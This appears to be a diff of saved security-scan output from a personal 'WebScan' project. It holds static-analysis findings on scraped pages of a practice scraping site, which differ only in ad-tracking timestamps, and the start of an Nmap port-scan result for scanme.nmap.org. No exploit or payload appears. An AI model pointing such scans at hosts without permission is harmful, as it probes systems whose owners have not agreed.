@@ -235,7 +235,7 @@
             ⋮┆----------------------------------------
           197┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           198┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487827033&amp;cv=9&amp;fst=1729487827033&
+               agead/viewthroughconversion/950945448/?random=1729494238841&amp;cv=9&amp;fst=1729494238841&
                amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=6&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
@@ -244,7 +244,7 @@
                adservices.com&amp;rfmt=3&amp;fmt=4"></script>                                             
             ⋮┆----------------------------------------
           198┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487827033&amp;cv=9&amp;fst=1729487827033&
+               agead/viewthroughconversion/950945448/?random=1729494238841&amp;cv=9&amp;fst=1729494238841&
                amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=6&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
@@ -478,22 +478,22 @@
             ⋮┆----------------------------------------
           189┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           190┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487793851&amp;cv=9&amp;fst=1729487793851&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635470%2C375603261%2C466465926%2
-               C512247838&amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=3&amp;u_
-               tz=180&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=
-               http%3A%2F%2Fwww.scrapethissite.com%2F&amp;tiba=Scrape%20This%20Site%20%7C%20A%20public%20s
-               andbox%20for%20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt
-               =4"></script>                                                                              
+               agead/viewthroughconversion/950945448/?random=1729494193689&amp;cv=9&amp;fst=1729494193689&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247838&a
+               mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=3&amp;u_tz=180&amp;u
+               _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
+               Fwww.scrapethissite.com%2F&amp;tiba=Scrape%20This%20Site%20%7C%20A%20public%20sandbox%20for
+               %20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt=4"></script
+               >                                                                                          
             ⋮┆----------------------------------------
           190┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487793851&amp;cv=9&amp;fst=1729487793851&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635470%2C375603261%2C466465926%2
-               C512247838&amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=3&amp;u_
-               tz=180&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=
-               http%3A%2F%2Fwww.scrapethissite.com%2F&amp;tiba=Scrape%20This%20Site%20%7C%20A%20public%20s
-               andbox%20for%20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt
-               =4"></script>                                                                              
+               agead/viewthroughconversion/950945448/?random=1729494193689&amp;cv=9&amp;fst=1729494193689&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247838&a
+               mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=3&amp;u_tz=180&amp;u
+               _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
+               Fwww.scrapethissite.com%2F&amp;tiba=Scrape%20This%20Site%20%7C%20A%20public%20sandbox%20for
+               %20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt=4"></script
+               >                                                                                          
                                                                                   
     /mnt/c/Users/erngu/source/repos/WebScan/ScrapedFiles/lessons/main/analytics.js
     ❯❱ javascript.lang.security.audit.detect-non-literal-regexp.detect-non-literal-regexp
@@ -705,7 +705,7 @@
                src="https://connect.facebook.net/en_US/fbevents.js"></script><script async=""             
                src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript"
                async=""                                                                                   
-               src="https://js.driftt.com/include/1729488000000/6nmy7z65gsxc.js"></script><script>        
+               src="https://js.driftt.com/include/1729494300000/6nmy7z65gsxc.js"></script><script>        
             ⋮┆----------------------------------------
            19┆ <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-
                09N5RQCFG4&amp;cx=c&amp;_slc=1"></script><script src="https://connect.facebook.net/signals/
@@ -722,7 +722,7 @@
                src="https://connect.facebook.net/en_US/fbevents.js"></script><script async=""             
                src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript"
                async=""                                                                                   
-               src="https://js.driftt.com/include/1729488000000/6nmy7z65gsxc.js"></script><script>        
+               src="https://js.driftt.com/include/1729494300000/6nmy7z65gsxc.js"></script><script>        
             ⋮┆----------------------------------------
            19┆ <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-
                09N5RQCFG4&amp;cx=c&amp;_slc=1"></script><script src="https://connect.facebook.net/signals/
@@ -739,43 +739,43 @@
                src="https://connect.facebook.net/en_US/fbevents.js"></script><script async=""             
                src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript"
                async=""                                                                                   
-               src="https://js.driftt.com/include/1729488000000/6nmy7z65gsxc.js"></script><script>        
+               src="https://js.driftt.com/include/1729494300000/6nmy7z65gsxc.js"></script><script>        
             ⋮┆----------------------------------------
-          324┆ </style><script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"  
+           45┆ <script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"          
                charset="utf-8"></script><link rel="stylesheet"                                            
                href="https://assets.gumroad.com/packs/css/overlay-63c6c0f7.css"><script                   
                type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthrough
-               conversion/950945448/?random=1729487808909&amp;cv=9&amp;fst=1729487808909&amp;num=1&amp;gui
-               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247839&amp;u_h=600&amp;u_
+               conversion/950945448/?random=1729494208074&amp;cv=9&amp;fst=1729494208074&amp;num=1&amp;gui
+               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247838&amp;u_h=600&amp;u_
                w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=5&amp;u_tz=180&amp;u_java=false&amp;u
                _nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2Fwww.scrapethissi
                te.com%2Flessons%2Fsign-up%2F&amp;tiba=Sign%20Up%20%7C%20Scrape%20This%20Site%20%7C%20A%20p
                ublic%20sandbox%20for%20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=
-               3&amp;fmt=4"></script></head>                                                              
+               3&amp;fmt=4"></script><style type="text/css">.drift-conductor-item iframe,                 
             ⋮┆----------------------------------------
-          324┆ </style><script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"  
+           45┆ <script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"          
                charset="utf-8"></script><link rel="stylesheet"                                            
                href="https://assets.gumroad.com/packs/css/overlay-63c6c0f7.css"><script                   
                type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthrough
-               conversion/950945448/?random=1729487808909&amp;cv=9&amp;fst=1729487808909&amp;num=1&amp;gui
-               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247839&amp;u_h=600&amp;u_
+               conversion/950945448/?random=1729494208074&amp;cv=9&amp;fst=1729494208074&amp;num=1&amp;gui
+               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247838&amp;u_h=600&amp;u_
                w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=5&amp;u_tz=180&amp;u_java=false&amp;u
                _nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2Fwww.scrapethissi
                te.com%2Flessons%2Fsign-up%2F&amp;tiba=Sign%20Up%20%7C%20Scrape%20This%20Site%20%7C%20A%20p
                ublic%20sandbox%20for%20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=
-               3&amp;fmt=4"></script></head>                                                              
+               3&amp;fmt=4"></script><style type="text/css">.drift-conductor-item iframe,                 
             ⋮┆----------------------------------------
-          324┆ </style><script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"  
+           45┆ <script src="https://assets.gumroad.com/packs/js/overlay-f8f9015a9aabefa09736.js"          
                charset="utf-8"></script><link rel="stylesheet"                                            
                href="https://assets.gumroad.com/packs/css/overlay-63c6c0f7.css"><script                   
                type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthrough
-               conversion/950945448/?random=1729487808909&amp;cv=9&amp;fst=1729487808909&amp;num=1&amp;gui
-               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247839&amp;u_h=600&amp;u_
+               conversion/950945448/?random=1729494208074&amp;cv=9&amp;fst=1729494208074&amp;num=1&amp;gui
+               d=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247838&amp;u_h=600&amp;u_
                w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=5&amp;u_tz=180&amp;u_java=false&amp;u
                _nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2Fwww.scrapethissi
                te.com%2Flessons%2Fsign-up%2F&amp;tiba=Sign%20Up%20%7C%20Scrape%20This%20Site%20%7C%20A%20p
                ublic%20sandbox%20for%20learning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=
-               3&amp;fmt=4"></script></head>                                                              
+               3&amp;fmt=4"></script><style type="text/css">.drift-conductor-item iframe,                 
             ⋮┆----------------------------------------
           715┆ <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
             ⋮┆----------------------------------------
@@ -1118,8 +1118,8 @@
             ⋮┆----------------------------------------
           189┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           190┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487832287&amp;cv=9&amp;fst=1729487832287&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494243409&amp;cv=9&amp;fst=1729494243409&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=7&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
                Fwww.scrapethissite.com%2Flogin%2F&amp;tiba=Login%20%7C%20Scrape%20This%20Site%20%7C%20A%20
@@ -1127,8 +1127,8 @@
                =3&amp;fmt=4"></script>                                                                    
             ⋮┆----------------------------------------
           190┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487832287&amp;cv=9&amp;fst=1729487832287&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494243409&amp;cv=9&amp;fst=1729494243409&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=7&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
                Fwww.scrapethissite.com%2Flogin%2F&amp;tiba=Login%20%7C%20Scrape%20This%20Site%20%7C%20A%20
@@ -1189,8 +1189,8 @@
             ⋮┆----------------------------------------
           216┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           217┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487880940&amp;cv=9&amp;fst=1729487880940&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494291906&amp;cv=9&amp;fst=1729494291906&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=12&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fadvanced%2F&amp;tiba=Advanced%20Topics%3A%20Real%20World
@@ -1199,8 +1199,8 @@
                /script>                                                                                   
             ⋮┆----------------------------------------
           217┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487880940&amp;cv=9&amp;fst=1729487880940&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494291906&amp;cv=9&amp;fst=1729494291906&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=12&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fadvanced%2F&amp;tiba=Advanced%20Topics%3A%20Real%20World
@@ -1436,8 +1436,8 @@
             ⋮┆----------------------------------------
           313┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           314┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487866220&amp;cv=9&amp;fst=1729487866220&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635471%2C375603261%2C466465925%2
+               agead/viewthroughconversion/950945448/?random=1729494277175&amp;cv=9&amp;fst=1729494277175&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635471%2C375603260%2C466465926%2
                C512247839&amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=10&amp;u
                _tz=180&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url
                =http%3A%2F%2Fwww.scrapethissite.com%2Fpages%2Fajax-javascript%2F&amp;tiba=Oscar%20Winning%
@@ -1449,8 +1449,8 @@
                style="display:none" scrolling="no"></iframe>                                              
             ⋮┆----------------------------------------
           314┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487866220&amp;cv=9&amp;fst=1729487866220&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635471%2C375603261%2C466465925%2
+               agead/viewthroughconversion/950945448/?random=1729494277175&amp;cv=9&amp;fst=1729494277175&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=376635471%2C375603260%2C466465926%2
                C512247839&amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=10&amp;u
                _tz=180&amp;u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url
                =http%3A%2F%2Fwww.scrapethissite.com%2Fpages%2Fajax-javascript%2F&amp;tiba=Oscar%20Winning%
@@ -1877,8 +1877,8 @@
             ⋮┆----------------------------------------
           1398┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           1399┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/
-               pagead/viewthroughconversion/950945448/?random=1729487845940&amp;cv=9&amp;fst=1729487845940
-               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&
+               pagead/viewthroughconversion/950945448/?random=1729494256983&amp;cv=9&amp;fst=1729494256983
+               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&
                amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=9&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fforms%2F&amp;tiba=Hockey%20Teams%3A%20Forms%2C%20Searchi
@@ -1886,8 +1886,8 @@
                rning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt=4"></script>     
             ⋮┆----------------------------------------
           1399┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/
-               pagead/viewthroughconversion/950945448/?random=1729487845940&amp;cv=9&amp;fst=1729487845940
-               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&
+               pagead/viewthroughconversion/950945448/?random=1729494256983&amp;cv=9&amp;fst=1729494256983
+               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247839&
                amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=9&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fforms%2F&amp;tiba=Hockey%20Teams%3A%20Forms%2C%20Searchi
@@ -2122,8 +2122,8 @@
             ⋮┆----------------------------------------
           234┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           235┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487874238&amp;cv=9&amp;fst=1729487874238&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494285118&amp;cv=9&amp;fst=1729494285118&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247839&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=11&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fframes%2F&amp;tiba=Turtles%20All%20the%20Way%20Down%3A%2
@@ -2131,8 +2131,8 @@
                earning%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt=4"></script>   
             ⋮┆----------------------------------------
           235┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487874238&amp;cv=9&amp;fst=1729487874238&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465926%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494285118&amp;cv=9&amp;fst=1729494285118&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247839&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=11&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fframes%2F&amp;tiba=Turtles%20All%20the%20Way%20Down%3A%2
@@ -2365,8 +2365,8 @@
             ⋮┆----------------------------------------
           229┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           230┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487800017&amp;cv=9&amp;fst=1729487800017&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494200044&amp;cv=9&amp;fst=1729494200044&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=4&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
                Fwww.scrapethissite.com%2Fpages%2F&amp;tiba=Learn%20Web%20Scraping%20%7C%20Scrape%20This%20
@@ -2374,8 +2374,8 @@
                ices.com&amp;rfmt=3&amp;fmt=4"></script>                                                   
             ⋮┆----------------------------------------
           230┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/p
-               agead/viewthroughconversion/950945448/?random=1729487800017&amp;cv=9&amp;fst=1729487800017&
-               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247839&a
+               agead/viewthroughconversion/950945448/?random=1729494200044&amp;cv=9&amp;fst=1729494200044&
+               amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465926%2C512247838&a
                mp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=4&amp;u_tz=180&amp;u
                _java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%2
                Fwww.scrapethissite.com%2Fpages%2F&amp;tiba=Learn%20Web%20Scraping%20%7C%20Scrape%20This%20
@@ -2626,8 +2626,8 @@
             ⋮┆----------------------------------------
           3966┆ <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
           3967┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/
-               pagead/viewthroughconversion/950945448/?random=1729487838306&amp;cv=9&amp;fst=1729487838306
-               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247838&
+               pagead/viewthroughconversion/950945448/?random=1729494249426&amp;cv=9&amp;fst=1729494249426
+               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247839&
                amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=8&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fsimple%2F&amp;tiba=Countries%20of%20the%20World%3A%20A%2
@@ -2635,8 +2635,8 @@
                g%20web%20scraping&amp;hn=www.googleadservices.com&amp;rfmt=3&amp;fmt=4"></script>         
             ⋮┆----------------------------------------
           3967┆ </script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/
-               pagead/viewthroughconversion/950945448/?random=1729487838306&amp;cv=9&amp;fst=1729487838306
-               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603260%2C466465925%2C512247838&
+               pagead/viewthroughconversion/950945448/?random=1729494249426&amp;cv=9&amp;fst=1729494249426
+               &amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;eid=375603261%2C466465925%2C512247839&
                amp;u_h=600&amp;u_w=800&amp;u_ah=600&amp;u_aw=800&amp;u_cd=24&amp;u_his=8&amp;u_tz=180&amp;
                u_java=false&amp;u_nplug=0&amp;u_nmime=0&amp;sendb=1&amp;ig=1&amp;frm=0&amp;url=http%3A%2F%
                2Fwww.scrapethissite.com%2Fpages%2Fsimple%2F&amp;tiba=Countries%20of%20the%20World%3A%20A%2
@@ -2650,8 +2650,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE nmaprun>
 <?xml-stylesheet href="file:///C:/Program Files (x86)/Nmap/nmap.xsl" type="text/xsl"?>
-<!-- Nmap 7.95 scan initiated Mon Oct 21 03:49:01 2024 as: nmap -oX C:/Users/erngu/source/repos/WebScan/NmapOutput/nmap_results.xml scanme.nmap.org -->
-<nmaprun scanner="nmap" args="nmap -oX C:/Users/erngu/source/repos/WebScan/NmapOutput/nmap_results.xml scanme.nmap.org" start="1729471741" startstr="Mon Oct 21 03:49:01 2024" version="7.95" xmloutputversion="1.05">
+<!-- Nmap 7.95 scan initiated Mon Oct 21 11:30:36 2024 as: nmap -oX C:/Users/erngu/source/repos/WebScan/NmapOutput/nmap_results.xml scanme.nmap.org -->
+<nmaprun scanner="nmap" args="nmap -oX C:/Users/erngu/source/repos/WebScan/NmapOutput/nmap_results.xml scanme.nmap.org" start="1729499436" startstr="Mon Oct 21 11:30:36 2024" version="7.95" xmloutputversion="1.05">
 <scaninfo type="syn" protocol="tcp" numservices="1000" services="1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3006,3011,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5985-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6